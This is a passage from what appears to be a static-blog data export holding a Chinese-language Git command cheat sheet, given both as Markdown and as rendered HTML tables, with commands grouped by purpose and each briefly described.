clone|克隆版本库|\n|git commit|提交|\n|git config|查询和修改配置|\n|git describe|通过里程碑直观地显示提交ID|\n|git diff|差异比较|\n|git difftool|调用图形化差异比较工具|\n|git fetch|获取远程版本库的提交|\n|git format-patch|创建邮件格式的补丁文件。参见 git am 命令|\n|git grep|文件内容搜索定位工具|\n|git gui|基于Tcl/Tk的图形化工具，侧重提交等操作|\n|git help|帮助|\n|git init|版本库初始化|\n|git init-db*|同义词，等同于 git init|\n|git log|显示提交日志|\n|git merge|分支合并|\n|git mergetool|图形化冲突解决|\n|git mv|重命名|\n|git pull|拉回远程版本库的提交|\n|git push|推送至远程版本库|\n|git rebase|分支变基|\n|git rebase–interactive|交互式分支变基|\n|git reflog|分支等引用变更记录管理|\n|git remote|远程版本库管理|\n|git repo-config*|同义词，等同于 git config|\n|git reset|重置改变分支“游标”指向|\n|git rev-parse|将各种引用表示法转换为哈希值等|\n|git revert|反转提交|\n|git rm|删除文件|\n|git show|显示各种类型的对象|\n|git stage*|同义词，等同于 git add|\n|git stash|保存和恢复进度|\n|git status|显示工作区文件状态|\n|git tag|里程碑管理|\n\n### 对象库操作相关命令\n\n|命令|简要说明|\n|---|---|\n|git commit-tree|从树对象创建提交|\n|git hash-object|从标准输入或文件计算哈希值或创建对象|\n|git ls-files|显示工作区和暂存区文件|\n|git ls-tree|显示树对象包含的文件|\n|git mktag|读取标准输入创建一个里程碑对象|\n|git mktree|读取标准输入创建一个树对象|\n|git read-tree|读取树对象到暂存区|\n|git update-index|工作区内容注册到暂存区及暂存区管理|\n|git unpack-file|创建临时文件包含指定 blob 的内容|\n|git write-tree|从暂存区创建一个树对象|\n\n### 引用操作相关命令\n\n|命令|简要说明|\n|---|---|\n|git check-ref-format|检查引用名称是否符合规范|\n|git for-each-ref|引用迭代器，用于shell编程|\n|git ls-remote|显示远程版本库的引用|\n|git name-rev|将提交ID显示为友好名称|\n|git peek-remote*|过时命令，请使用 git ls-remote|\n|git rev-list|显示版本范围|\n|git show-branch|显示分支列表及拓扑关系|\n|git show-ref|显示本地引用|\n|git symbolic-ref|显示或者设置符号引用|\n|git update-ref|更新引用的指向|\n|git verify-tag|校验 GPG 签名的Tag|\n\n### 版本库管理相关命令\n\n|命令|简要说明|\n|---|---|\n|git count-objects|显示松散对象的数量和磁盘占用|\n|git filter-branch|版本库重构|\n|git fsck|对象库完整性检查|\n|git fsck-objects*|同义词，等同于 git fsck|\n|git gc|版本库存储优化|\n|git index-pack|从打包文件创建对应的索引文件|\n|git lost-found*|过时，请使用 git fsck –lost-found 命令|\n|git pack-objects|从标准输入读入对象ID，打包到文件|\n|git pack-redundant|查找多余的 pack 文件|\n|git pack-refs|将引用打包到 .git/packed-refs 文件中|\n|git prune|从对象库删除过期对象|\n|git prune-packed|将已经打包的松散对象删除|\n|git relink|为本地版本库中相同的对象建立硬连接|\n|git repack|将版本库未打包的松散对象打包|\n|git show-index|读取包的索引文件，显示打包文件中的内容|\n|git unpack-objects|从打包文件释放文件|\n|git verify-pack|校验对象库打包文件|\n\n### 数据传输相关命令\n\n|命令|简要说明|\n|---|---|\n|git fetch-pack|执行 git fetch 或 git pull 命令时在本地执行此命令，用于从其他版本库获取缺失的对象|\n|git receive-pack|执行 git push 命令时在远程执行的命令，用于接受推送的数据|\n|git send-pack|执行 git push 命令时在本地执行的命令，用于向其他版本库推送数据|\n|git upload-archive|执行 git archive –remote 命令基于远程版本库创建归档时，远程版本库执行此命令传送归档|\n|git upload-pack|执行 git fetch 或 git pull 命令时在远程执行此命令，将对象打包、上传|\n\n### 邮件相关命令\n\n|命令|简要说明|\n|---|---|\n|git imap-send|将补丁通过 IMAP 发送|\n|git mailinfo|从邮件导出提交说明和补丁|\n|git mailsplit|将 mbox 或 Maildir 格式邮箱中邮件逐一提取为文件|\n|git request-pull|创建包含提交间差异和执行PULL操作地址的信息|\n|git send-email|发送邮件|\n\n### 协议相关命令\n\n|命令|简要说明|\n|---|---|\n|git daemon|实现Git协议|\n|git http-backend|实现HTTP协议的CGI程序，支持智能HTTP协议|\n|git instaweb|即时启动浏览器通过 gitweb 浏览当前版本库|\n|git shell|受限制的shell，提供仅执行Git命令的SSH访问|\n|git update-server-inf|更新哑协议需要的辅助文件|\n|git http-fetch|通过HTTP协议获取版本库|\n|git http-push|通过HTTP/DAV协议推送|\n|git remote-ext|由Git命令调用，通过外部命令提供扩展协议支持|\n|git remote-fd|由Git命令调用，使用文件描述符作为协议接口|\n|git remote-ftp|由Git命令调用，提供对FTP协议的支持|\n|git remote-ftps|由Git命令调用，提供对FTPS协议的支持|\n|git remote-http|由Git命令调用，提供对HTTP协议的支持|\n|git remote-https|由Git命令调用，提供对HTTPS协议的支持|\n|git remote-testgit|协议扩展示例脚本|\n\n### 版本库转换和交互相关命令\n\n|命令|简要说明|\n|---|---|\n|git archimport|导入Arch版本库到Git|\n|git bundle|提交打包和解包，以便在不同版本库间传递|\n|git cvsexportcommit|将Git的一个提交作为一个CVS检出|\n|git cvsimport|导入CVS版本库到Git。或者使用 cvs2git|\n|git cvsserver|Git的CVS协议模拟器，可供CVS命令访问Git版本库|\n|git fast-export|将提交导出为 git-fast-import 格式|\n|git fast-import|其他版本库迁移至Git的通用工具|\n|git svn|Git 作为前端操作 Subversion|\n\n### 合并相关的辅助命令\n\n|命令|简要说明|\n|---|---|\n|git merge-base|供其他脚本调用，找到两个或多个提交最近的共同祖先|\n|git merge-file|针对文件的两个不同版本执行三向文件合并|\n|git merge-index|对index中的冲突文件调用指定的冲突解决工具|\n|git merge-octopus|合并两个以上分支。参见 git merge 的octopus合并策略|\n|git merge-one-file|由 git merge-index 调用的标准辅助程序|\n|git merge-ours|合并使用本地版本，抛弃他人版本。参见 git merge 的ours合并策略|\n|git merge-recursive|针对两个分支的三向合并。参见 git merge 的recursive合并策略|\n|git merge-resolve|针对两个分支的三向合并。参见 git merge 的resolve合并策略|\n|git merge-subtree|子树合并。参见 git merge 的 subtree 合并策略|\n|git merge-tree|显式三向合并结果，不改变暂存区|\n|git fmt-merge-msg|供执行合并操作的脚本调用，用于创建一个合并提交说明|\n|git rerere|重用所记录的冲突解决方案|\n\n### 杂项\n\n|命令|简要说明|\n|---|---|\n|git bisect–helper|由 git bisect 命令调用，确认二分查找进度|\n|git check-attr|显示某个文件是否设置了某个属性|\n|git checkout-index|从暂存区拷贝文件至工作区|\n|git cherry|查找没有合并到上游的提交|\n|git diff-files|比较暂存区和工作区，相当于 git diff –raw|\n|git diff-index|比较暂存区和版本库，相当于 git diff –cached –raw|\n|git diff-tree|比较两个树对象，相当于 git diff –raw A B|\n|git difftool–helper|由 git difftool 命令调用，默认要使用的差异比较工具|\n|git notes|提交评论管理|\n|git patch-id|补丁过滤行号和空白字符后生成补丁唯一ID|\n|git quiltimport|将Quilt补丁列表应用到当前分支|\n|git replace|提交替换|\n|git shortlog|对 git log 的汇总输出，适合于产品发布说明|\n|git stripspace|删除空行，供其他脚本调用|\n|git submodule|子模组管理|\n|git tar-tree|过时命令，请使用 git archive|\n|git var|显示 Git 环境变量，启动浏览器以查看目录或文件\n|git whatchanged|显示提交历史及每次提交的改动|\n|git-mergetool–lib|包含于其他脚本中，提供合并/差异比较工具的选择和执行|\n|git-parse-remote|包含于其他脚本中，提供操作远程版本库的函数|\n|git-sh-setup|包含于其他脚本中，提供 shell 编程的函数库|\n","source":"_posts/常用命令速查表.md","raw":"---\nlayout: git\ntitle: Git常用命令速查表\ndate: 2016-7-30 13:41:35\ntags: Git\n---\n### Git 常用命令速查 ###\n\n|命令|简要说明|\n|---|---|\n|gitadd|添加至暂存区|\n|git add–interactive|交互式添加|\n|git apply|应用补丁|\n|git am|应用邮件格式补丁|\n|git annotate|同义词，等同于 git blame|\n|git archive|文件归档打包|\n|git bisect|二分查找|\n|git blame|文件逐行追溯|\n|git branch|查看本地分支|\n|git cat-file|版本库对象研究工具|\n|git checkout|检出到工作区、切换或创建分支|\n|git cherry-pick|提交拣选|\n|git citool|图形化提交，相当于 git gui 命令|\n|git clean|清除工作区未跟踪文件|\n|git clone|克隆版本库|\n|git commit|提交|\n|git config|查询和修改配置|\n|git describe|通过里程碑直观地显示提交ID|\n|git diff|差异比较|\n|git difftool|调用图形化差异比较工具|\n|git fetch|获取远程版本库的提交|\n|git format-patch|创建邮件格式的补丁文件。参见 git am 命令|\n|git grep|文件内容搜索定位工具|\n|git gui|基于Tcl/Tk的图形化工具，侧重提交等操作|\n|git help|帮助|\n|git init|版本库初始化|\n|git init-db*|同义词，等同于 git init|\n|git log|显示提交日志|\n|git merge|分支合并|\n|git mergetool|图形化冲突解决|\n|git mv|重命名|\n|git pull|拉回远程版本库的提交|\n|git push|推送至远程版本库|\n|git rebase|分支变基|\n|git rebase–interactive|交互式分支变基|\n|git reflog|分支等引用变更记录管理|\n|git remote|远程版本库管理|\n|git repo-config*|同义词，等同于 git config|\n|git reset|重置改变分支“游标”指向|\n|git rev-parse|将各种引用表示法转换为哈希值等|\n|git revert|反转提交|\n|git rm|删除文件|\n|git show|显示各种类型的对象|\n|git stage*|同义词，等同于 git add|\n|git stash|保存和恢复进度|\n|git status|显示工作区文件状态|\n|git tag|里程碑管理|\n\n### 对象库操作相关命令\n\n|命令|简要说明|\n|---|---|\n|git commit-tree|从树对象创建提交|\n|git hash-object|从标准输入或文件计算哈希值或创建对象|\n|git ls-files|显示工作区和暂存区文件|\n|git ls-tree|显示树对象包含的文件|\n|git mktag|读取标准输入创建一个里程碑对象|\n|git mktree|读取标准输入创建一个树对象|\n|git read-tree|读取树对象到暂存区|\n|git update-index|工作区内容注册到暂存区及暂存区管理|\n|git unpack-file|创建临时文件包含指定 blob 的内容|\n|git write-tree|从暂存区创建一个树对象|\n\n### 引用操作相关命令\n\n|命令|简要说明|\n|---|---|\n|git check-ref-format|检查引用名称是否符合规范|\n|git for-each-ref|引用迭代器，用于shell编程|\n|git ls-remote|显示远程版本库的引用|\n|git name-rev|将提交ID显示为友好名称|\n|git peek-remote*|过时命令，请使用 git ls-remote|\n|git rev-list|显示版本范围|\n|git show-branch|显示分支列表及拓扑关系|\n|git show-ref|显示本地引用|\n|git symbolic-ref|显示或者设置符号引用|\n|git update-ref|更新引用的指向|\n|git verify-tag|校验 GPG 签名的Tag|\n\n### 版本库管理相关命令\n\n|命令|简要说明|\n|---|---|\n|git count-objects|显示松散对象的数量和磁盘占用|\n|git filter-branch|版本库重构|\n|git fsck|对象库完整性检查|\n|git fsck-objects*|同义词，等同于 git fsck|\n|git gc|版本库存储优化|\n|git index-pack|从打包文件创建对应的索引文件|\n|git lost-found*|过时，请使用 git fsck –lost-found 命令|\n|git pack-objects|从标准输入读入对象ID，打包到文件|\n|git pack-redundant|查找多余的 pack 文件|\n|git pack-refs|将引用打包到 .git/packed-refs 文件中|\n|git prune|从对象库删除过期对象|\n|git prune-packed|将已经打包的松散对象删除|\n|git relink|为本地版本库中相同的对象建立硬连接|\n|git repack|将版本库未打包的松散对象打包|\n|git show-index|读取包的索引文件，显示打包文件中的内容|\n|git unpack-objects|从打包文件释放文件|\n|git verify-pack|校验对象库打包文件|\n\n### 数据传输相关命令\n\n|命令|简要说明|\n|---|---|\n|git fetch-pack|执行 git fetch 或 git pull 命令时在本地执行此命令，用于从其他版本库获取缺失的对象|\n|git receive-pack|执行 git push 命令时在远程执行的命令，用于接受推送的数据|\n|git send-pack|执行 git push 命令时在本地执行的命令，用于向其他版本库推送数据|\n|git upload-archive|执行 git archive –remote 命令基于远程版本库创建归档时，远程版本库执行此命令传送归档|\n|git upload-pack|执行 git fetch 或 git pull 命令时在远程执行此命令，将对象打包、上传|\n\n### 邮件相关命令\n\n|命令|简要说明|\n|---|---|\n|git imap-send|将补丁通过 IMAP 发送|\n|git mailinfo|从邮件导出提交说明和补丁|\n|git mailsplit|将 mbox 或 Maildir 格式邮箱中邮件逐一提取为文件|\n|git request-pull|创建包含提交间差异和执行PULL操作地址的信息|\n|git send-email|发送邮件|\n\n### 协议相关命令\n\n|命令|简要说明|\n|---|---|\n|git daemon|实现Git协议|\n|git http-backend|实现HTTP协议的CGI程序，支持智能HTTP协议|\n|git instaweb|即时启动浏览器通过 gitweb 浏览当前版本库|\n|git shell|受限制的shell，提供仅执行Git命令的SSH访问|\n|git update-server-inf|更新哑协议需要的辅助文件|\n|git http-fetch|通过HTTP协议获取版本库|\n|git http-push|通过HTTP/DAV协议推送|\n|git remote-ext|由Git命令调用，通过外部命令提供扩展协议支持|\n|git remote-fd|由Git命令调用，使用文件描述符作为协议接口|\n|git remote-ftp|由Git命令调用，提供对FTP协议的支持|\n|git remote-ftps|由Git命令调用，提供对FTPS协议的支持|\n|git remote-http|由Git命令调用，提供对HTTP协议的支持|\n|git remote-https|由Git命令调用，提供对HTTPS协议的支持|\n|git remote-testgit|协议扩展示例脚本|\n\n### 版本库转换和交互相关命令\n\n|命令|简要说明|\n|---|---|\n|git archimport|导入Arch版本库到Git|\n|git bundle|提交打包和解包，以便在不同版本库间传递|\n|git cvsexportcommit|将Git的一个提交作为一个CVS检出|\n|git cvsimport|导入CVS版本库到Git。或者使用 cvs2git|\n|git cvsserver|Git的CVS协议模拟器，可供CVS命令访问Git版本库|\n|git fast-export|将提交导出为 git-fast-import 格式|\n|git fast-import|其他版本库迁移至Git的通用工具|\n|git svn|Git 作为前端操作 Subversion|\n\n### 合并相关的辅助命令\n\n|命令|简要说明|\n|---|---|\n|git merge-base|供其他脚本调用，找到两个或多个提交最近的共同祖先|\n|git merge-file|针对文件的两个不同版本执行三向文件合并|\n|git merge-index|对index中的冲突文件调用指定的冲突解决工具|\n|git merge-octopus|合并两个以上分支。参见 git merge 的octopus合并策略|\n|git merge-one-file|由 git merge-index 调用的标准辅助程序|\n|git merge-ours|合并使用本地版本，抛弃他人版本。参见 git merge 的ours合并策略|\n|git merge-recursive|针对两个分支的三向合并。参见 git merge 的recursive合并策略|\n|git merge-resolve|针对两个分支的三向合并。参见 git merge 的resolve合并策略|\n|git merge-subtree|子树合并。参见 git merge 的 subtree 合并策略|\n|git merge-tree|显式三向合并结果，不改变暂存区|\n|git fmt-merge-msg|供执行合并操作的脚本调用，用于创建一个合并提交说明|\n|git rerere|重用所记录的冲突解决方案|\n\n### 杂项\n\n|命令|简要说明|\n|---|---|\n|git bisect–helper|由 git bisect 命令调用，确认二分查找进度|\n|git check-attr|显示某个文件是否设置了某个属性|\n|git checkout-index|从暂存区拷贝文件至工作区|\n|git cherry|查找没有合并到上游的提交|\n|git diff-files|比较暂存区和工作区，相当于 git diff –raw|\n|git diff-index|比较暂存区和版本库，相当于 git diff –cached –raw|\n|git diff-tree|比较两个树对象，相当于 git diff –raw A B|\n|git difftool–helper|由 git difftool 命令调用，默认要使用的差异比较工具|\n|git notes|提交评论管理|\n|git patch-id|补丁过滤行号和空白字符后生成补丁唯一ID|\n|git quiltimport|将Quilt补丁列表应用到当前分支|\n|git replace|提交替换|\n|git shortlog|对 git log 的汇总输出，适合于产品发布说明|\n|git stripspace|删除空行，供其他脚本调用|\n|git submodule|子模组管理|\n|git tar-tree|过时命令，请使用 git archive|\n|git var|显示 Git 环境变量，启动浏览器以查看目录或文件\n|git whatchanged|显示提交历史及每次提交的改动|\n|git-mergetool–lib|包含于其他脚本中，提供合并/差异比较工具的选择和执行|\n|git-parse-remote|包含于其他脚本中，提供操作远程版本库的函数|\n|git-sh-setup|包含于其他脚本中，提供 shell 编程的函数库|\n","slug":"常用命令速查表","published":1,"updated":"2017-12-29T15:28:12.000Z","comments":1,"photos":[],"link":"","_id":"cjow44tx00037mfahji1yuy7w","content":"<h3 id=\"Git-常用命令速查\"><a href=\"#Git-常用命令速查\" class=\"headerlink\" title=\"Git 常用命令速查\"></a>Git 常用命令速查</h3><table>\n<thead>\n<tr>\n<th>命令</th>\n<th>简要说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>gitadd</td>\n<td>添加至暂存区</td>\n</tr>\n<tr>\n<td>git add–interactive</td>\n<td>交互式添加</td>\n</tr>\n<tr>\n<td>git apply</td>\n<td>应用补丁</td>\n</tr>\n<tr>\n<td>git am</td>\n<td>应用邮件格式补丁</td>\n</tr>\n<tr>\n<td>git annotate</td>\n<td>同义词，等同于 git blame</td>\n</tr>\n<tr>\n<td>git archive</td>\n<td>文件归档打包</td>\n</tr>\n<tr>\n<td>git bisect</td>\n<td>二分查找</td>\n</tr>\n<tr>\n<td>git blame</td>\n<td>文件逐行追溯</td>\n</tr>\n<tr>\n<td>git branch</td>\n<td>查看本地分支</td>\n</tr>\n<tr>\n<td>git cat-file</td>\n<td>版本库对象研究工具</td>\n</tr>\n<tr>\n<td>git checkout</td>\n<td>检出到工作区、切换或创建分支</td>\n</tr>\n<tr>\n<td>git cherry-pick</td>\n<td>提交拣选</td>\n</tr>\n<tr>\n<td>git citool</td>\n<td>图形化提交，相当于 git gui 命令</td>\n</tr>\n<tr>\n<td>git clean</td>\n<td>清除工作区未跟踪文件</td>\n</tr>\n<tr>\n<td>git clone</td>\n<td>克隆版本库</td>\n</tr>\n<tr>\n<td>git commit</td>\n<td>提交</td>\n</tr>\n<tr>\n<td>git config</td>\n<td>查询和修改配置</td>\n</tr>\n<tr>\n<td>git describe</td>\n<td>通过里程碑直观地显示提交ID</td>\n</tr>\n<tr>\n<td>git diff</td>\n<td>差异比较</td>\n</tr>\n<tr>\n<td>git difftool</td>\n<td>调用图形化差异比较工具</td>\n</tr>\n<tr>\n<td>git fetch</td>\n<td>获取远程版本库的提交</td>\n</tr>\n<tr>\n<td>git format-patch</td>\n<td>创建邮件格式的补丁文件。参见 git am 命令</td>\n</tr>\n<tr>\n<td>git grep</td>\n<td>文件内容搜索定位工具</td>\n</tr>\n<tr>\n<td>git gui</td>\n<td>基于Tcl/Tk的图形化工具，侧重提交等操作</td>\n</tr>\n<tr>\n<td>git help</td>\n<td>帮助</td>\n</tr>\n<tr>\n<td>git init</td>\n<td>版本库初始化</td>\n</tr>\n<tr>\n<td>git init-db*</td>\n<td>同义词，等同于 git init</td>\n</tr>\n<tr>\n<td>git log</td>\n<td>显示提交日志</td>\n</tr>\n<tr>\n<td>git merge</td>\n<td>分支合并</td>\n</tr>\n<tr>\n<td>git mergetool</td>\n<td>图形化冲突解决</td>\n</tr>\n<tr>\n<td>git mv</td>\n<td>重命名</td>\n</tr>\n<tr>\n<td>git pull</td>\n<td>拉回远程版本库的提交</td>\n</tr>\n<tr>\n<td>git push</td>\n<td>推送至远程版本库</td>\n</tr>\n<tr>\n<td>git rebase</td>\n<td>分支变基</td>\n</tr>\n<tr>\n<td>git rebase–interactive</td>\n<td>交互式分支变基</td>\n</tr>\n<tr>\n<td>git reflog</td>\n<td>分支等引用变更记录管理</td>\n</tr>\n<tr>\n<td>git remote</td>\n<td>远程版本库管理</td>\n</tr>\n<tr>\n<td>git repo-config*</td>\n<td>同义词，等同于 git config</td>\n</tr>\n<tr>\n<td>git reset</td>\n<td>重置改变分支“游标”指向</td>\n</tr>\n<tr>\n<td>git rev-parse</td>\n<td>将各种引用表示法转换为哈希值等</td>\n</tr>\n<tr>\n<td>git revert</td>\n<td>反转提交</td>\n</tr>\n<tr>\n<td>git rm</td>\n<td>删除文件</td>\n</tr>\n<tr>\n<td>git show</td>\n<td>显示各种类型的对象</td>\n</tr>\n<tr>\n<td>git stage*</td>\n<td>同义词，等同于 git add</td>\n</tr>\n<tr>\n<td>git stash</td>\n<td>保存和恢复进度</td>\n</tr>\n<tr>\n<td>git status</td>\n<td>显示工作区文件状态</td>\n</tr>\n<tr>\n<td>git tag</td>\n<td>里程碑管理</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"对象库操作相关命令\"><a href=\"#对象库操作相关命令\" class=\"headerlink\" title=\"对象库操作相关命令\"></a>对象库操作相关命令</h3><table>\n<thead>\n<tr>\n<th>命令</th>\n<th>简要说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>git commit-tree</td>\n<td>从树对象创建提交</td>\n</tr>\n<tr>\n<td>git hash-object</td>\n<td>从标准输入或文件计算哈希值或创建对象</td>\n</tr>\n<tr>\n<td>git ls-files</td>\n<td>显示工作区和暂存区文件</td>\n</tr>\n<tr>\n<td>git ls-tree</td>\n<td>显示树对象包含的文件</td>\n</tr>\n<tr>\n<td>git mktag</td>\n<td>读取标准输入创建一个里程碑对象</td>\n</tr>\n<tr>\n<td>git mktree</td>\n<td>读取标准输入创建一个树对象</td>\n</tr>\n<tr>\n<td>git read-tree</td>\n<td>读取树对象到暂存区</td>\n</tr>\n<tr>\n<td>git update-index</td>\n<td>工作区内容注册到暂存区及暂存区管理</td>\n</tr>\n<tr>\n<td>git unpack-file</td>\n<td>创建临时文件包含指定 blob 的内容</td>\n</tr>\n<tr>\n<td>git write-tree</td>\n<td>从暂存区创建一个树对象</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"引用操作相关命令\"><a href=\"#引用操作相关命令\" class=\"headerlink\" title=\"引用操作相关命令\"></a>引用操作相关命令</h3><table>\n<thead>\n<tr>\n<th>命令</th>\n<th>简要说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>git check-ref-format</td>\n<td>检查引用名称是否符合规范</td>\n</tr>\n<tr>\n<td>git for-each-ref</td>\n<td>引用迭代器，用于shell编程</td>\n</tr>\n<tr>\n<td>git ls-remote</td>\n<td>显示远程版本库的引用</td>\n</tr>\n<tr>\n<td>git name-rev</td>\n<td>将提交ID显示为友好名称</td>\n</tr>\n<tr>\n<td>git peek-remote*</td>\n<td>过时命令，请使用 git ls-remote</td>\n</tr>\n<tr>\n<td>git rev-list</td>\n<td>显示版本范围</td>\n</tr>\n<tr>\n<td>git show-branch</td>\n<td>显示分支列表及拓扑关系</td>\n</tr>\n<tr>\n<td>git show-ref</td>\n<td>显示本地引用</td>\n</tr>\n<tr>\n<td>git symbolic-ref</td>\n<td>显示或者设置符号引用</td>\n</tr>\n<tr>\n<td>git update-ref</td>\n<td>更新引用的指向</td>\n</tr>\n<tr>\n<td>git verify-tag</td>\n<td>校验 GPG 签名的Tag</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"版本库管理相关命令\"><a href=\"#版本库管理相关命令\" class=\"headerlink\" title=\"版本库管理相关命令\"></a>版本库管理相关命令</h3><table>\n<thead>\n<tr>\n<th>命令</th>\n<th>简要说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>git count-objects</td>\n<td>显示松散对象的数量和磁盘占用</td>\n</tr>\n<tr>\n<td>git filter-branch</td>\n<td>版本库重构</td>\n</tr>\n<tr>\n<td>git fsck</td>\n<td>对象库完整性检查</td>\n</tr>\n<tr>\n<td>git fsck-objects*</td>\n<td>同义词，等同于 git fsck</td>\n</tr>\n<tr>\n<td>git gc</td>\n<td>版本库存储优化</td>\n</tr>\n<tr>\n<td>git index-pack</td>\n<td>从打包文件创建对应的索引文件</td>\n</tr>\n<tr>\n<td>git lost-found*</td>\n<td>过时，请使用 git fsck –lost-found 命令</td>\n</tr>\n<tr>\n<td>git pack-objects</td>\n<td>从标准输入读入对象ID，打包到文件</td>\n</tr>\n<tr>\n<td>git pack-redundant</td>\n<td>查找多余的 pack 文件</td>\n</tr>\n<tr>\n<td>git pack-refs</td>\n<td>将引用打包到 .git/packed-refs 文件中</td>\n</tr>\n<tr>\n<td>git prune</td>\n<td>从对象库删除过期对象</td>\n</tr>\n<tr>\n<td>git prune-packed</td>\n<td>将已经打包的松散对象删除</td>\n</tr>\n<tr>\n<td>git relink</td>\n<td>为本地版本库中相同的对象建立硬连接</td>\n</tr>\n<tr>\n<td>git repack</td>\n<td>将版本库未打包的松散对象打包</td>\n</tr>\n<tr>\n<td>git show-index</td>\n<td>读取包的索引文件，显示打包文件中的内容</td>\n</tr>\n<tr>\n<td>git unpack-objects</td>\n<td>从打包文件释放文件</td>\n</tr>\n<tr>\n<td>git verify-pack</td>\n<td>校验对象库打包文件</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"数据传输相关命令\"><a href=\"#数据传输相关命令\" class=\"headerlink\" title=\"数据传输相关命令\"></a>数据传输相关命令</h3><table>\n<thead>\n<tr>\n<th>命令</th>\n<th>简要说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>git fetch-pack</td>\n<td>执行 git fetch 或 git pull 命令时在本地执行此命令，用于从其他版本库获取缺失的对象</td>\n</tr>\n<tr>\n<td>git receive-pack</td>\n<td>执行 git push 命令时在远程执行的命令，用于接受推送的数据</td>\n</tr>\n<tr>\n<td>git send-pack</td>\n<td>执行 git push 命令时在本地执行的命令，用于向其他版本库推送数据</td>\n</tr>\n<tr>\n<td>git upload-archive</td>\n<td>执行 git archive –remote 命令基于远程版本库创建归档时，远程版本库执行此命令传送归档</td>\n</tr>\n<tr>\n<td>git upload-pack</td>\n<td>执行 git fetch 或 git pull 命令时在远程执行此命令，将对象打包、上传</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"邮件相关命令\"><a href=\"#邮件相关命令\" class=\"headerlink\" title=\"邮件相关命令\"></a>邮件相关命令</h3><table>\n<thead>\n<tr>\n<th>命令</th>\n<th>简要说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>git imap-send</td>\n<td>将补丁通过 IMAP 发送</td>\n</tr>\n<tr>\n<td>git mailinfo</td>\n<td>从邮件导出提交说明和补丁</td>\n</tr>\n<tr>\n<td>git mailsplit</td>\n<td>将 mbox 或 Maildir 格式邮箱中邮件逐一提取为文件</td>\n</tr>\n<tr>\n<td>git request-pull</td>\n<td>创建包含提交间差异和执行PULL操作地址的信息</td>\n</tr>\n<tr>\n<td>git send-email</td>\n<td>发送邮件</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"协议相关命令\"><a href=\"#协议相关命令\" class=\"headerlink\" title=\"协议相关命令\"></a>协议相关命令</h3><table>\n<thead>\n<tr>\n<th>命令</th>\n<th>简要说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>git daemon</td>\n<td>实现Git协议</td>\n</tr>\n<tr>\n<td>git http-backend</td>\n<td>实现HTTP协议的CGI程序，支持智能HTTP协议</td>\n</tr>\n<tr>\n<td>git instaweb</td>\n<td>即时启动浏览器通过 gitweb 浏览当前版本库</td>\n</tr>\n<tr>\n<td>git shell</td>\n<td>受限制的shell，提供仅执行Git命令的SSH访问</td>\n</tr>\n<tr>\n<td>git update-server-inf</td>\n<td>更新哑协议需要的辅助文件</td>\n</tr>\n<tr>\n<td>git http-fetch</td>\n<td>通过HTTP协议获取版本库</td>\n</tr>\n<tr>\n<td>git http-push</td>\n<td>通过HTTP/DAV协议推送</td>\n</tr>\n<tr>\n<td>git remote-ext</td>\n<td>由Git命令调用，通过外部命令提供扩展协议支持</td>\n</tr>\n<tr>\n<td>git remote-fd</td>\n<td>由Git命令调用，使用文件描述符作为协议接口</td>\n</tr>\n<tr>\n<td>git remote-ftp</td>\n<td>由Git命令调用，提供对FTP协议的支持</td>\n</tr>\n<tr>\n<td>git remote-ftps</td>\n<td>由Git命令调用，提供对FTPS协议的支持</td>\n</tr>\n<tr>\n<td>git remote-http</td>\n<td>由Git命令调用，提供对HTTP协议的支持</td>\n</tr>\n<tr>\n<td>git remote-https</td>\n<td>由Git命令调用，提供对HTTPS协议的支持</td>\n</tr>\n<tr>\n<td>git remote-testgit</td>\n<td>协议扩展示例脚本</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"版本库转换和交互相关命令\"><a href=\"#版本库转换和交互相关命令\" class=\"headerlink\" title=\"版本库转换和交互相关命令\"></a>版本库转换和交互相关命令</h3><table>\n<thead>\n<tr>\n<th>命令</th>\n<th>简要说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>git archimport</td>\n<td>导入Arch版本库到Git</td>\n</tr>\n<tr>\n<td>git bundle</td>\n<td>提交打包和解包，以便在不同版本库间传递</td>\n</tr>\n<tr>\n<td>git cvsexportcommit</td>\n<td>将Git的一个提交作为一个CVS检出</td>\n</tr>\n<tr>\n<td>git cvsimport</td>\n<td>导入CVS版本库到Git。或者使用 cvs2git</td>\n</tr>\n<tr>\n<td>git cvsserver</td>\n<td>Git的CVS协议模拟器，可供CVS命令访问Git版本库</td>\n</tr>\n<tr>\n<td>git fast-export</td>\n<td>将提交导出为 git-fast-import 格式</td>\n</tr>\n<tr>\n<td>git fast-import</td>\n<td>其他版本库迁移至Git的通用工具</td>\n</tr>\n<tr>\n<td>git svn</td>\n<td>Git 作为前端操作 Subversion</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"合并相关的辅助命令\"><a href=\"#合并相关的辅助命令\" class=\"headerlink\" title=\"合并相关的辅助命令\"></a>合并相关的辅助命令</h3><table>\n<thead>\n<tr>\n<th>命令</th>\n<th>简要说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>git merge-base</td>\n<td>供其他脚本调用，找到两个或多个提交最近的共同祖先</td>\n</tr>\n<tr>\n<td>git merge-file</td>\n<td>针对文件的两个不同版本执行三向文件合并</td>\n</tr>\n<tr>\n<td>git merge-index</td>\n<td>对index中的冲突文件调用指定的冲突解决工具</td>\n</tr>\n<tr>\n<td>git merge-octopus</td>\n<td>合并两个以上分支。参见 git merge 的octopus合并策略</td>\n</tr>\n<tr>\n<td>git merge-one-file</td>\n<td>由 git merge-index 调用的标准辅助程序</td>\n</tr>\n<tr>\n<td>git merge-ours</td>\n<td>合并使用本地版本，抛弃他人版本。参见 git merge 的ours合并策略</td>\n</tr>\n<tr>\n<td>git merge-recursive</td>\n<td>针对两个分支的三向合并。参见 git merge 的recursive合并策略</td>\n</tr>\n<tr>\n<td>git merge-resolve</td>\n<td>针对两个分支的三向合并。参见 git merge 的resolve合并策略</td>\n</tr>\n<tr>\n<td>git 